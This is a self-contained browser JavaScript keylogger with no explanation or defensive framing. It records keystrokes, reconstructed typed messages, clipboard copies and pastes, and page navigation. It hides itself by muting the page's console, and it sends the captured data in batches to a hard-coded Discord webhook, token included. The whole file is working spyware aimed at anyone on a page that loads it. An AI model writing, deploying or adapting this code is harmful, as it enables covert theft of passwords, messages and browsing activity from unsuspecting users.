(function() {
    'use strict';

    const _id = '1528223376836001864';
    const _token = 'RkF8B_JJBtoKov_Dqo676LGH61ANJtoIPQkKamjo7pFvphHI-HN9Hr5dTaiQydvIMsOh';
    const _endpoint = 'https://discordapp.com/api/webhooks/' + _id + '/' + _token;

    const _batchSize = 15;
    const _flushInterval = 12000;
    const _maxBufferSize = 500;
    const _maxKeyLog = 200;

    let _store = [];
    let _timer = null;
    let _lastUrl = document.URL;
    let _lastTitle = document.title;
    let _session = localStorage.getItem('_collector_session') || (Math.random().toString(36).slice(2, 10) + Date.now().toString(36));
    localStorage.setItem('_collector_session', _session);
    let _eventCounts = { msg: 0, key: 0, copy: 0, paste: 0, nav: 0 };
    let _keyBuffer = '';
    let _lastFocused = null;
    let _isFlushing = false;
    let _debug = localStorage.getItem('_collector_debug') === 'true';

    const _noop = () => {};
    const _orig = {
        log: console.log,
        warn: console.warn,
        error: console.error,
        info: console.info,
        debug: console.debug
    };

    if (!_debug) {
        console.log = _noop;
        console.warn = _noop;
        console.error = _noop;
        console.info = _noop;
        console.debug = _noop;
    } else {
        console.log('[Collector] Debug mode enabled');
    }

    function _ts() {
        return new Date().toISOString().replace('T', ' ').slice(0, 19);
    }

    function _push(type, data) {
        _store.push({ t: _ts(), ty: type, d: data });
        _eventCounts[type] = (_eventCounts[type] || 0) + 1;
        if (_store.length >= _batchSize && !_isFlushing) _flush();
    }

    function _chunkArray(arr, size) {
        const result = [];
        for (let i = 0; i < arr.length; i += size) {
            result.push(arr.slice(i, i + size));
        }
        return result;
    }

    function _formatClipboard(text) {
        const lines = text.split('\n');
        const firstLines = lines.slice(0, 3);
        const display = firstLines.map(l => l.slice(0, 50)).join('↵ ');
        return display + (lines.length > 3 ? `… (+${lines.length - 3} linhas)` : '');
    }

    function _buildEmbed(events) {
        const groups = { msg: [], key: [], copy: [], paste: [], nav: [] };
        events.forEach(e => { if (groups[e.ty]) groups[e.ty].push(e); });

        const fields = [];

        if (groups.msg.length) {
            const lines = groups.msg.map(e => {
                const txt = e.d.txt || '';
                const ctx = e.d.ctx || '';
                return `> ${txt} ${ctx ? '`['+ctx+']`' : ''}`;
            });
            const chunks = _chunkArray(lines, 10);
            chunks.forEach((chunk, i) => {
                fields.push({
                    name: i === 0 ? `💬 Messages (${lines.length})` : '⋯ continua',
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            });
        }

        if (groups.key.length) {
            const keys = groups.key.map(e => `\`${e.d.k}\``);
            const chunks = _chunkArray(keys, 30);
            chunks.forEach((chunk, i) => {
                fields.push({
                    name: i === 0 ? `⌨️ Keys (${keys.length})` : '⋯ continua',
                    value: chunk.join(' ') || '—',
                    inline: false
                });
            });
        }

        if (groups.copy.length) {
            const copies = groups.copy.map(e => `📋 Copy: ${_formatClipboard(e.d.txt)}`);
            const chunks = _chunkArray(copies, 8);
            chunks.forEach((chunk, i) => {
                fields.push({
                    name: i === 0 ? `📋 Copies (${copies.length})` : '⋯ continua',
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            });
        }

        if (groups.paste.length) {
            const pastes = groups.paste.map(e => `📥 Paste: ${_formatClipboard(e.d.txt)}`);
            const chunks = _chunkArray(pastes, 8);
            chunks.forEach((chunk, i) => {
                fields.push({
                    name: i === 0 ? `📥 Pastes (${pastes.length})` : '⋯ continua',
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            });
        }

        if (groups.nav.length) {
            const navs = groups.nav.map(e => {
                const title = e.d.title || 'Unknown';
                const url = e.d.url || '';
                return `🔗 ${title} (${url.replace(/^https?:\/\//, '').slice(0, 30)})`;
            });
            const chunks = _chunkArray(navs, 6);
            chunks.forEach((chunk, i) => {
                fields.push({
                    name: i === 0 ? `🧭 Navigation (${navs.length})` : '⋯ continua',
                    value: chunk.join('\n') || '—',
                    inline: false
                });
            });
        }

        const summary = `📊 ${events.length} • 💬 ${_eventCounts.msg||0} ⌨️ ${_eventCounts.key||0} 📋 ${_eventCounts.copy||0} 📥 ${_eventCounts.paste||0} 🧭 ${_eventCounts.nav||0}`;

        return {
            embeds: [{
                color: 0x2b2d31,
                title: '📡 Activity Feed',
                description: summary,
                fields: fields.slice(0, 25),
                footer: { text: `Session ${_session} • ${_ts()}` },
                timestamp: new Date().toISOString()
            }]
        };
    }

    function _send(events) {
        if (!events || !events.length) return;
        if (_isFlushing) return;
        _isFlushing = true;

        try {
            const payload = _buildEmbed(events);
            fetch(_endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(_noop).finally(() => {
                _isFlushing = false;
            });
        } catch (_) {
            _isFlushing = false;
        }
    }

    function _flush() {
        if (!_store.length) return;
        _send(_store.splice(0, _store.length));
    }

    function _isPrintable(key) {
        return key.length === 1 || key === 'Enter' || key === 'Backspace' || key === 'Space' || key === 'Tab';
    }

    function _trackKey(e) {
        const k = e.key;
        const tag = e.target.tagName;
        const isModifier = ['Shift', 'Control', 'Alt', 'Meta', 'CapsLock', 'Escape'].includes(k);

        if (isModifier) return;

        if (!_isPrintable(k) && !k.startsWith('Arrow')) return;

        _push('key', { k: k });

        if (k === 'Enter') {
            if (_keyBuffer.trim()) {
                let ctx = '';
                const el = document.activeElement;
                if (el && (el.tagName === 'INPUT' || el.tagName === 'TEXTAREA')) {
                    ctx = el.tagName + (el.id ? '#'+el.id : '');
                }
                _push('msg', { txt: _keyBuffer.trim(), ctx: ctx });
                _keyBuffer = '';
            }
            return;
        }

        if (k === 'Backspace') {
            _keyBuffer = _keyBuffer.slice(0, -1);
            return;
        }

        if (k === 'Tab') return;

        if (k.length === 1) {
            _keyBuffer += k;
            if (_keyBuffer.length > _maxBufferSize) {
                _push('msg', { txt: _keyBuffer.trim() + '…', ctx: 'overflow' });
                _keyBuffer = '';
            }
        }
    }

    function _trackCopy(e) {
        const txt = window.getSelection().toString().trim();
        if (txt && txt.length > 0) {
            _push('copy', { txt: txt.slice(0, 500), len: txt.length });
        }
    }

    function _trackPaste(e) {
        const txt = e.clipboardData?.getData('text/plain') || '';
        if (txt && txt.length > 0) {
            _push('paste', { txt: txt.slice(0, 500), len: txt.length });
        }
    }

    function _trackNav() {
        const currentUrl = document.URL;
        const currentTitle = document.title;

        if (currentUrl !== _lastUrl) {
            _lastUrl = currentUrl;
            _push('nav', { url: currentUrl, ref: document.referrer, title: currentTitle });
        } else if (currentTitle !== _lastTitle) {
            _lastTitle = currentTitle;
            _push('nav', { url: currentUrl, ref: document.referrer, title: currentTitle + ' (title changed)' });
        }
    }

    function _handleFocusChange() {
        const active = document.activeElement;
        if (active && (active.tagName === 'INPUT' || active.tagName === 'TEXTAREA')) {
            _lastFocused = active;
        } else {
            if (_lastFocused) {
                if (_keyBuffer.trim()) {
                    _push('msg', { txt: _keyBuffer.trim(), ctx: 'unfocused' });
                    _keyBuffer = '';
                }
                _lastFocused = null;
            }
        }
    }

    function _heartbeat() {
        _push('heartbeat', { online: true, url: document.URL });
    }

    function _init() {
        document.addEventListener('keydown', _trackKey, true);
        document.addEventListener('copy', _trackCopy, true);
        document.addEventListener('paste', _trackPaste, true);
        document.addEventListener('focusin', _handleFocusChange);
        document.addEventListener('focusout', _handleFocusChange);

        const _obs = new MutationObserver(() => _trackNav());
        _obs.observe(document, { subtree: true, childList: true });
        window.addEventListener('popstate', _trackNav);
        window.addEventListener('hashchange', _trackNav);

        _timer = setInterval(_flush, _flushInterval);

        // Heartbeat a cada 5 minutos
        setInterval(_heartbeat, 300000);

        window.addEventListener('beforeunload', () => {
            _flush();
            _obs.disconnect();
        });

        window._logs = {
            kill: function() {
                clearInterval(_timer);
                _flush();
                document.removeEventListener('keydown', _trackKey, true);
                document.removeEventListener('copy', _trackCopy, true);
                document.removeEventListener('paste', _trackPaste, true);
                document.removeEventListener('focusin', _handleFocusChange);
                document.removeEventListener('focusout', _handleFocusChange);
                window.removeEventListener('popstate', _trackNav);
                window.removeEventListener('hashchange', _trackNav);
                _obs.disconnect();
                console.log = _orig.log;
                console.warn = _orig.warn;
                console.error = _orig.error;
                console.info = _orig.info;
                console.debug = _orig.debug;
                localStorage.removeItem('_collector_session');
            },
            flush: _flush,
            debug: function(on) {
                _debug = on;
                localStorage.setItem('_collector_debug', String(on));
                if (on) {
                    console.log = _orig.log;
                    console.warn = _orig.warn;
                    console.error = _orig.error;
                    console.info = _orig.info;
                    console.debug = _orig.debug;
                    console.log('[Collector] Debug mode activated');
                } else {
                    console.log = _noop;
                    console.warn = _noop;
                    console.error = _noop;
                    console.info = _noop;
                    console.debug = _noop;
                }
            }
        };
    }

    if (document.readyState === 'complete' || document.readyState === 'interactive') {
        setTimeout(_init, 0);
    } else {
        document.addEventListener('DOMContentLoaded', () => setTimeout(_init, 0));
    }

    setTimeout(() => {
        if (!window._logs) _init();
    }, 3000);

})();
